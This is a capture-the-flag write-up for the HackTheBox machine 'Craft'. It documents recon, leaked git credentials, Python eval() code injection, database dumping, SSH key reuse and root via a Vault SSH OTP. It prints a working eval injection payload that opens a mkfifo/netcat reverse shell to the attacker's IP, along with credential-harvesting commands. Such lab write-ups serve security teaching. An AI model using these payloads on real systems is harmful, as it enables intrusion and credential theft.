# **HackTheBox — Craft | Full Writeup**

> **Platform:** Hack The Box
>
> **Author:** k41r0s3
>
> **Difficulty:** Medium
>
> **Category:** Web / Linux
>
> **OS:** Linux (Debian 9 host, Alpine Docker containers)
>
> **Date:** March 19, 2026

---

## TL;DR

Discovered `api.craft.htb` and `gogs.craft.htb` from the SSL cert and HTML navbar. The public Gogs repo `Craft/craft-api` had credentials hardcoded in a test script visible in commit history, and the issue tracker leaked a JWT token in a curl example. Source code confirmed a Python `eval()` sink on the `abv` field of the brew API — direct code injection after authenticating with the leaked credentials. Shell landed inside an Alpine Docker container as root. Reading `settings.py` and using the app's own database connector script dumped all user credentials from MySQL. Logging into Gogs as Gilfoyle with his database password revealed a private infrastructure repo containing his encrypted SSH private key — passphrase reused from his account password. On the host, a HashiCorp Vault token in `~/.vault-token` gave access to the SSH OTP secret engine, generating a one-time password for a direct root SSH session on localhost.

---

## Table of Contents

1. [Enumeration](#enumeration)
2. [Subdomain Discovery](#subdomain-discovery)
3. [Gogs Git Recon](#gogs-git-recon)
4. [API Analysis](#api-analysis)
5. [Foothold — eval() RCE](#foothold--eval-rce)
6. [Post-Exploitation — Docker Container](#post-exploitation--docker-container)
7. [Lateral Movement — Gogs Private Repo](#lateral-movement--gogs-private-repo)
8. [SSH as Gilfoyle — User Flag](#ssh-as-gilfoyle--user-flag)
9. [Privilege Escalation — HashiCorp Vault](#privilege-escalation--hashicorp-vault)
10. [Attack Chain](#attack-chain)
11. [Tools Used](#tools-used)
12. [Key Takeaways](#key-takeaways)

---

## Enumeration

Quick scan first to confirm live ports, then full aggressive scan with vuln scripts.

```bash
# Quick top-100 scan
nmap -sV --open -T4 --top-ports 100 <TARGET_IP>

# Full scan with vuln scripts
nmap -sV -sC -A --open -T4 --top-ports 1000 \
  --script vuln,smb-vuln-ms17-010,smb-vuln-ms08-067,http-shellshock,ssl-heartbleed \
  <TARGET_IP> -oN nmap_craft.txt
```

**Results:**

| Port | State | Service | Version |
| --- | --- | --- | --- |
| 22/tcp | open | ssh | OpenSSH 7.4p1 Debian 10+deb9u6 |
| 443/tcp | open | ssl/http | nginx 1.15.8 |

**SSL cert details extracted by nmap:**
```
commonName=craft.htb
organizationName=Craft
Not valid before: 2019-02-06
Not valid after:  2020-06-20  ← expired self-signed cert
```

**Notable vulners CVEs (mostly noise on this box):**

| CVE | Score | Service | Verdict |
| --- | --- | --- | --- |
| CVE-2023-38408 | 9.8 | OpenSSH 7.4p1 | Requires ssh-agent forwarding — not applicable here |
| CVE-2018-15473 | 5.9 | OpenSSH 7.4p1 | Username enumeration — useful later |
| CVE-2021-23017 | 7.7 | nginx 1.15.8 | Requires specific DNS resolver config — skip |
| CVE-2019-9513/9511 | 7.8 | nginx 1.15.8 | HTTP/2 DoS — out of scope |

**Thought process:** Two ports only. No port 80 — HTTPS exclusively on 443. The SSL cert CN field immediately gives us the hostname `craft.htb` without any further enumeration. All CVEs from the vulners script are either DoS, require existing access, or specific conditions not present here. App-layer vulnerabilities always take priority over version CVEs on web-focused HTB boxes.

```bash
echo "<TARGET_IP> craft.htb" | sudo tee -a /etc/hosts
```

---

## Subdomain Discovery

Rather than running ffuf immediately, curl the HTML source first. Developers embed their own infrastructure in navbars.

```bash
curl -sk https://craft.htb | grep -E "href|api|gogs|git"
```

**Relevant output:**
```html
<li><a href="https://api.craft.htb/api/">API</a></li>
<li><a href="https://gogs.craft.htb/">
  <img border="0" alt="Git" src="/static/img/Git-Icon-Black.png">
</a></li>
```

Both subdomains found directly from the page source — zero fuzzing needed.

```bash
echo "<TARGET_IP> api.craft.htb gogs.craft.htb" | sudo tee -a /etc/hosts
python scope.py add api.craft.htb
python scope.py add gogs.craft.htb
```

**Gogs version check:**
```bash
curl -sk https://gogs.craft.htb | grep -i "version\|gogs\|go1"
# Footer: Gogs 0.11.86.0130  Go1.11.5
```

**API endpoint check:**
```bash
curl -sk https://api.craft.htb/api/     # 404
curl -sk https://api.craft.htb/api/ui/  # 404
curl -sk https://api.craft.htb/         # 404
```

API root 404s everywhere — source code is needed to discover valid endpoints.

**Thought process:** `curl | grep href` on the main page found both subdomains in 5 seconds before any wordlist fuzzing. Gogs version `0.11.86` is notable — CVE-2019-14544 affects exactly this version (missing authorization checks on API routes for deploy keys, collaborators, and hooks). The API returning 404 everywhere tells us the Swagger/OpenAPI UI isn't exposed — we need to read the source.

---

## Gogs Git Recon

### Exploring Public Repos

```bash
curl -sk "https://gogs.craft.htb/explore/repos"
# → Craft/craft-api | "An API for IPA's." | 1 open issue | 6 commits
```

One public repo. Pulled the user list from the issue assignee dropdown:

| Username | Full Name | Role |
| --- | --- | --- |
| `dinesh` | Dinesh Chugtai | Collaborator |
| `ebachman` | Erlich Bachman | Owner |
| `gilfoyle` | Bertram Gilfoyle | Collaborator |

**Thought process:** User enumeration from the Gogs UI is completely unauthenticated. These three usernames are now targets for credential reuse against SSH, Gogs login, and anything else we find later.

### Reading Issue #2 — JWT Token Leak

```bash
curl -sk "https://gogs.craft.htb/Craft/craft-api/issues/2" \
  | grep -A5 "comment\|content\|curl"
```

Issue #2 "Bogus ABV values" — Dinesh posted a real (now expired) JWT token in a curl example to demonstrate the bug:

```
X-Craft-API-Token: eyJhbGci...  (expired 2019 token)
```

Even though expired, this confirmed: the API uses an `X-Craft-API-Token` header, the auth endpoint is `/api/auth/login`, and login uses HTTP Basic auth returning a JWT.

The issue thread also revealed the team dynamic:
- Dinesh reports bogus ABV values can be submitted
- Erlich tells Dinesh to fix it himself
- Dinesh pushes a "fix" (the eval() patch)
- Gilfoyle calls it a "sorry excuse for a patch" and says he fixed the DB schema instead

This thread tells us the eval() vulnerability was introduced as a patch and was never properly removed.

### Extracting Commit Hashes

```bash
curl -sk "https://gogs.craft.htb/Craft/craft-api/commits/master" \
  | grep -oP 'href="/Craft/craft-api/commit/\K[a-f0-9]+'
```

**6 commits returned** — small enough to check every diff manually.

### Credential Leak — Commit History

The commit titled "Cleanup test" is an immediate signal — a cleanup always means the previous commit contained something worth removing. Checking the commit immediately before the cleanup:

```bash
curl -sk "https://gogs.craft.htb/Craft/craft-api/commit/<hash_of_add_test_script>"
```

**Diff revealed (added lines in tests/test.py):**
```python
+response = requests.get('https://api.craft.htb/api/auth/login',
+                        auth=('<username>', '<password>'), verify=False)
+json_response = json.loads(response.text)
+token = json_response['token']
+headers = { 'X-Craft-API-Token': token, 'Content-Type': 'application/json' }
```

The following "Cleanup test" commit replaced those credentials with empty strings — but they were already committed and permanently accessible in history.

**Thought process:** Reading every commit diff is non-negotiable on small repos. The cleanup commit is the tell — it points you directly at the previous commit. Developers commit secrets constantly and then attempt to remove them; git history is immutable so the secret stays forever. We now have valid API credentials without touching the API at all.

---

## API Analysis

### Reading brew.py Source

```bash
curl -sk "https://gogs.craft.htb/Craft/craft-api/raw/master/craft_api/api/brew/endpoints/brew.py"
```

**Key vulnerability in the POST /brew/ endpoint:**

```python
@auth.auth_required
@api.expect(beer_entry)
def post(self):
    """Creates a new brew entry."""
    # make sure the ABV value is sane.
    if eval('%s > 1' % request.json['abv']):   # ← DIRECT CODE INJECTION
        return "ABV must be a decimal value less than 1.0", 400
    else:
        create_brew(request.json)
        return None, 201
```

The `abv` field is inserted raw into Python's `eval()`. Endpoint is protected by `@auth.auth_required` — a valid JWT is required first.

### Reading settings.py

```bash
curl -sk "https://gogs.craft.htb/Craft/craft-api/raw/master/craft_api/settings.py"
```

Settings file contained the JWT signing key and MySQL database credentials — both now in hand from the public repo.

**Thought process:** `eval('%s > 1' % request.json['abv'])` is not a validation mechanism — it is arbitrary Python code execution. When `abv = "0.5"`, eval executes `0.5 > 1` → `False`. When `abv = "__import__('os').system('id')"`, eval executes `__import__('os').system('id') > 1` — `os.system()` runs first, spawns our command, returns exit code 0, then `0 > 1` → `False`. Our code executes before any comparison happens. Reading source before probing the API told us exactly what to send — no fuzzing required.

---

## Foothold — eval() RCE

### Step 1 — Get JWT Token

```bash
curl -sk "https://api.craft.htb/api/auth/login" \
  -u '<username>:<password>' | python3 -m json.tool
```

**Response:**
```json
{
    "token": "<JWT_TOKEN>"
}
```

Export for use in the payload:
```bash
TOKEN=$(curl -sk "https://api.craft.htb/api/auth/login" \
  -u '<username>:<password>' | \
  python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")
echo $TOKEN
```

Token is short-lived — chain these commands quickly.

### Step 2 — Start Listener

```bash
nc -lvnp 4444
```

### Step 3 — Trigger RCE

```bash
curl -sk -X POST "https://api.craft.htb/api/brew/" \
  -H "X-Craft-API-Token: $TOKEN" \
  -H "Content-Type: application/json" \
  -d "{\"name\":\"x\",\"brewer\":\"x\",\"style\":\"x\",\"abv\":\"__import__('os').system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <YOUR_TUN0_IP> 4444 >/tmp/f')\"}"
```

**Shell received:**
```
connect to [<YOUR_TUN0_IP>] from (UNKNOWN) [<TARGET_IP>] <port>
/bin/sh: can't access tty; job control turned off
/opt/app #
```

**What eval actually executes:**
```python
eval("__import__('os').system('rm /tmp/f;mkfifo /tmp/f;...nc <YOUR_TUN0_IP> 4444...') > 1")
# os.system() runs first → spawns reverse shell → returns exit code 0
# 0 > 1 → False
# Flask receives False → falls through to create_brew() — doesn't matter, we have a shell
```

**Why `__import__('os')`:** Inside `eval()`, Python builtins are available but module-level imports from the surrounding scope may not be in context. `__import__()` is always a builtin and imports the module inline.

**Why mkfifo over bash -i:** Alpine Linux in Docker has `/bin/sh` (busybox ash) but not necessarily bash. The mkfifo named pipe method works with any POSIX shell.

---

## Post-Exploitation — Docker Container

### Identifying the Environment

```bash
id        # uid=0(root) gid=0(root)
hostname  # <container_hash_id>  ← Docker container ID
cat /etc/os-release  # Alpine Linux
ls /opt/app  # app.py  craft_api  dbtest.py  tests
```

Root inside a Docker Alpine container. The hostname is a container hash ID — confirmed later by looking at the host's process list. Root inside Docker ≠ root on the host. The goal now is to find credentials and move laterally.

### Reading Application Settings

```bash
cat /opt/app/craft_api/settings.py
```

Settings file contained:
- JWT signing secret
- MySQL database username, password, database name, and host

### Dumping the Database

`dbtest.py` already had a working MySQL connector — only the SQL query needed changing:

```bash
cd /opt/app && python3 -c "
import pymysql
from craft_api import settings
connection = pymysql.connect(
    host=settings.MYSQL_DATABASE_HOST,
    user=settings.MYSQL_DATABASE_USER,
    password=settings.MYSQL_DATABASE_PASSWORD,
    db=settings.MYSQL_DATABASE_DB,
    cursorclass=pymysql.cursors.DictCursor
)
try:
    with connection.cursor() as cursor:
        cursor.execute('SELECT * FROM user')
        print(cursor.fetchall())
finally:
    connection.close()
"
```

**Result:** All three user accounts with plaintext passwords returned — dinesh, ebachman, and gilfoyle.

**Thought process:** Must `cd /opt/app` first — the `from craft_api import settings` import is relative and fails from any other directory. `dbtest.py` was already written with a working connector — we only swapped the query from `SELECT ... FROM brew LIMIT 1` to `SELECT * FROM user`. The database consistently contains more users and more sensitive data than the application exposes via its API.

---

## Lateral Movement — Gogs Private Repo

### Attempting SSH

```bash
ssh dinesh@<TARGET_IP>    # Permission denied (publickey)
ssh ebachman@<TARGET_IP>  # Permission denied (publickey)
ssh gilfoyle@<TARGET_IP>  # Permission denied (publickey)
```

SSH requires key-based authentication only — password auth is disabled on the host.

### Gogs API — Finding Private Repos

Gilfoyle is the sysadmin character — responsible for infrastructure, Vault, and security. His account is the primary target. His database password was tried against Gogs:

```bash
# Always quote URLs in zsh — unquoted ? is treated as a glob pattern and errors
curl -sk "https://gogs.craft.htb/api/v1/user/repos" \
  -u 'gilfoyle:<password>' | python3 -m json.tool
```

**Private repo found:**
```json
{
    "name": "craft-infra",
    "full_name": "gilfoyle/craft-infra",
    "description": "Craft infrastructure",
    "private": true,
    "permissions": {
        "admin": true,
        "push": true,
        "pull": true
    }
}
```

CVE-2019-14544 (Gogs 0.11.86 missing auth checks on API routes) is relevant context here — though in practice we had valid credentials anyway.

### Accessing the Private Repo

```bash
# List repo contents
curl -sk "https://gogs.craft.htb/gilfoyle/craft-infra" \
  -u 'gilfoyle:<password>' | grep -E "href.*ssh|\.ssh"
# → .ssh folder visible in the file tree
```

```bash
# Grab the private key
curl -sk "https://gogs.craft.htb/gilfoyle/craft-infra/raw/master/.ssh/id_rsa" \
  -u 'gilfoyle:<password>'

# Grab the public key
curl -sk "https://gogs.craft.htb/gilfoyle/craft-infra/raw/master/.ssh/id_rsa.pub" \
  -u 'gilfoyle:<password>'
```

The key header `-----BEGIN OPENSSH PRIVATE KEY-----` with `aes256-ctr` and `bcrypt` in the body indicates it is passphrase-protected.

**Thought process:** The credential reuse pattern: DB password → Gogs login → SSH key passphrase. Developers who reuse passwords across services tend to also reuse the same value as their SSH key passphrase. The `craft-infra` repo name is a dead giveaway for infrastructure secrets. Always look for `.ssh` folders in any repository — this is where developers store operational keys.

---

## SSH as Gilfoyle — User Flag

```bash
# Save the key
cat > /tmp/gilfoyle_id_rsa << 'EOF'
-----BEGIN OPENSSH PRIVATE KEY-----
<key_content>
-----END OPENSSH PRIVATE KEY-----
EOF

chmod 600 /tmp/gilfoyle_id_rsa

# SSH in — passphrase = same as Gogs/DB password
ssh -i /tmp/gilfoyle_id_rsa gilfoyle@<TARGET_IP>
```

```bash
gilfoyle@craft:~$ cat user.txt
**[REDACTED]**
```

---

## Privilege Escalation — HashiCorp Vault

### Home Directory Enumeration

```bash
ls -la ~
```

```
drwx------ 4 gilfoyle gilfoyle 4096 Feb  9  2019 .
-rw-r--r-- 1 gilfoyle gilfoyle  634 Feb  9  2019 .bashrc
drwx------ 3 gilfoyle gilfoyle 4096 Feb  9  2019 .config
-r-------- 1 gilfoyle gilfoyle   33 <date>       user.txt
-rw------- 1 gilfoyle gilfoyle   36 Feb  9  2019 .vault-token   ← HIGH VALUE
-rw------- 1 gilfoyle gilfoyle 2546 Feb  9  2019 .viminfo
```

`.vault-token` immediately visible. Vault confirmed running as root in the process list:

```bash
ps aux | grep vault
# root  <PID>  vault server -config /vault/config/config.hcl
```

### Standard Privesc Checks — Dead Ends

```bash
# SUID binaries — nothing unusual beyond standard system binaries
find / -perm -4000 -type f 2>/dev/null

# Linux capabilities — nothing exploitable
/sbin/getcap -r / 2>/dev/null
# gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep  (not useful)

# No sudo installed
sudo -l
# -bash: sudo: command not found
```

**Thought process:** `ls -la ~` is always the first command on a new shell. `.vault-token` was sitting openly in the home directory — no enumeration script needed. Other high-value dot files to always check: `.aws/credentials`, `.kube/config`, `.env`, `.netrc`, `.config/`. Vault running as root combined with a token file in the home directory is a clear privesc path before touching SUID or capabilities.

### Vault Enumeration

```bash
export VAULT_TOKEN=$(cat ~/.vault-token)
export VAULT_ADDR=https://vault.craft.htb:8200

vault status
# Sealed: false | Version: 0.11.1

vault secrets list
```

```
Path          Type         Description
cubbyhole/    cubbyhole    per-token private secret storage
identity/     identity     identity store
secret/       kv           key/value secret storage
ssh/          ssh          n/a                              ← TARGET
sys/          system       system endpoints
```

```bash
vault list ssh/roles
# root_otp

vault read ssh/roles/root_otp
# default_user: root
# key_type:     otp
# cidr_list:    0.0.0.0/0
# port:         22
```

### Generating OTP and Getting Root

```bash
# Generate one-time password for root SSH on localhost
vault write ssh/creds/root_otp ip=127.0.0.1
```

```
key         <OTP_VALUE>
key_type    otp
username    root
ip          127.0.0.1
```

```bash
# SSH as root — use the OTP as the password when prompted
ssh root@127.0.0.1
```

```bash
root@craft:~# cat root.txt
**[REDACTED]**
```

**How the Vault SSH OTP engine works:** Vault generates a random one-time password and registers it with a helper daemon running on the target host. The SSH daemon has the Vault OTP auth plugin configured — when SSH is attempted with the OTP as the password, sshd validates it against Vault. The `root_otp` role is configured with `default_user=root` and `cidr_list=0.0.0.0/0` — any IP, any time, for root. The OTP is single-use and disappears after the first successful login. Because Vault is running as root and owns the OTP registration process, this is a direct root path requiring no exploit at all.

---

## Attack Chain

```
[Recon]
  nmap -sV -sC -A --open -T4 --top-ports 1000 --script vuln <TARGET_IP>
  → port 22 (OpenSSH 7.4p1), port 443 (nginx 1.15.8)
  SSL cert CN=craft.htb → hostname discovered
  /etc/hosts → <TARGET_IP> craft.htb
         │
         ▼
[Subdomain Discovery]
  curl -sk https://craft.htb | grep href
  → api.craft.htb (Flask REST API)
  → gogs.craft.htb (Gogs 0.11.86 git server)
  /etc/hosts → api.craft.htb gogs.craft.htb
         │
         ▼
[Gogs Git Recon]
  /explore/repos → Craft/craft-api (public, 6 commits)
  /explore/users → dinesh, ebachman, gilfoyle
  /issues/2 → expired JWT in curl example (confirms auth header + endpoint)
  commit "add test script" → credentials hardcoded in tests/test.py
  commit "Cleanup test" → signal pointing back to previous commit
  brew.py source → eval('%s > 1' % request.json['abv']) — code injection
  settings.py → JWT signing key + MySQL credentials
         │
         ▼
[Foothold — eval() RCE]
  POST /api/auth/login -u '<user>:<pass>' → JWT token
  nc -lvnp 4444
  POST /api/brew/ abv="__import__('os').system('mkfifo revshell...')"
  → reverse shell received on port 4444
         │
         ▼
[Shell — root inside Alpine Docker container]
         │
         ▼
[Post-Exploitation]
  cat /opt/app/craft_api/settings.py → MySQL password + JWT secret
  cd /opt/app && python3 → SELECT * FROM user
  → all three user passwords retrieved in plaintext
         │
         ▼
[Lateral Movement]
  ssh <all users>@<TARGET_IP> → denied (key auth only)
  curl "https://gogs.craft.htb/api/v1/user/repos" -u 'gilfoyle:<pass>'
  → gilfoyle/craft-infra (private repo)
  raw/master/.ssh/id_rsa → AES256-CTR bcrypt encrypted SSH key
  raw/master/.ssh/id_rsa.pub → gilfoyle@craft.htb
         │
         ▼
[SSH as Gilfoyle]
  ssh -i gilfoyle_id_rsa gilfoyle@<TARGET_IP>
  passphrase = same as Gogs/DB password (credential reuse)
         │
         ▼
[User Flag]
  ~/user.txt → **[REDACTED]**
         │
         ▼
[PrivEsc Enumeration]
  ls -la ~ → .vault-token present
  ps aux | grep vault → vault server running as root
  SUID / capabilities / sudo → nothing exploitable
         │
         ▼
[HashiCorp Vault SSH OTP]
  export VAULT_TOKEN=$(cat ~/.vault-token)
  export VAULT_ADDR=https://vault.craft.htb:8200
  vault secrets list → ssh/ engine
  vault list ssh/roles → root_otp
  vault read ssh/roles/root_otp → default_user=root, key_type=otp
  vault write ssh/creds/root_otp ip=127.0.0.1 → OTP generated
  ssh root@127.0.0.1 (OTP as password)
         │
         ▼
[Root Flag]
  /root/root.txt → **[REDACTED]**
```

---

## Tools Used

| Tool | Purpose |
| --- | --- |
| `nmap` | Port scanning, service detection, SSL cert extraction, vulners CVE mapping |
| `curl` | HTML source reading, Gogs API enumeration, commit diff reading, API exploitation |
| `python3` | JSON parsing, JWT token extraction, MySQL queries via pymysql |
| `netcat (nc)` | Reverse shell listener |
| `vault` | SSH OTP secret engine enumeration and OTP generation |
| `ssh` | Host access as gilfoyle (key auth) and root (OTP) |
| `grep / regex` | Filtering curl output for hostnames, commit hashes, credentials |
| `scope.py` | HTB AI-BBH scope management |

---

## Key Takeaways

**1. Git history is permanent — secrets committed are secrets exposed forever**
A developer committed credentials into a test script, noticed the mistake, and removed them in the very next commit. The credentials stayed in the git log forever and were trivially recoverable. A "cleanup" commit title is itself a signal — it tells you the previous commit had something worth removing. Always read every commit diff in a repository, not just the current HEAD. Once a secret is committed to any version control system, assume it is compromised.

**2. Issue trackers are overlooked goldmines — read every comment**
A developer posted a real API token in a curl example inside a bug report to demonstrate the vulnerability. Even though the token was expired, it revealed the authentication header name, the login endpoint, and the auth flow. Developers constantly paste real tokens and credentials in issue comments without thinking. Issue trackers are completely skipped during recon by most people and are consistently high-value.

**3. eval() on user input is direct code injection — no bypass required**
`eval('%s > 1' % request.json['abv'])` was intended as ABV decimal validation. Instead it created arbitrary Python code execution with no filter whatsoever. Reading the source code before probing the API told us exactly what to send — no fuzzing, no guessing. When source is available, read it before touching the API.

**4. Credential reuse is the most reliable lateral movement technique**
The same password worked as the database credential, the Gogs login, and the SSH private key passphrase — three layers of reuse from a single value. Always try credentials in order: DB password → Git server → SSH key passphrase → `su` on host. On HTB this succeeds far more often than brute force.

**5. `ls -la ~` is always the first command on every new shell**
`.vault-token` was sitting openly in the home directory — no enumeration script needed, no linpeas, just `ls -la ~`. High-value dot files to always check: `.vault-token`, `.aws/credentials`, `.kube/config`, `.env`, `.netrc`, `.config/`. These files are the difference between a dead-end shell and a full compromise. Run this before anything else on every new shell.

**6. HashiCorp Vault SSH OTP bypasses all traditional privesc methods**
When Vault runs as root and exposes an SSH OTP role with `default_user=root`, generating a one-time password and SSH-ing to localhost as root requires no kernel exploit, no SUID abuse, and no sudo misconfiguration. It is an intentional administrative feature being leveraged as an attack path. Whenever Vault is running on a machine, enumerate the `ssh/` secrets engine immediately.

**7. HTML source always beats vhost fuzzing — read it first**
Both subdomains were in the main page navbar. A single curl and grep found them in under 10 seconds before any ffuf run. ffuf would have taken minutes and required the correct wordlist. On targeted engagements, applications always link their own infrastructure. Source code first, fuzzing second.

**8. zsh URL quoting — always quote URLs containing special characters**
Running `curl -sk https://host/path?param=val` in zsh fails silently with "no matches found" because zsh treats `?` as a glob pattern. Always double-quote URLs: `curl -sk "https://host/path?param=val"`. Applies to any URL containing `?`, `&`, `*`, `[`, `]`, `{`, `}` in zsh.

---

*Written by k41r0s3 | HackTheBox | Craft*
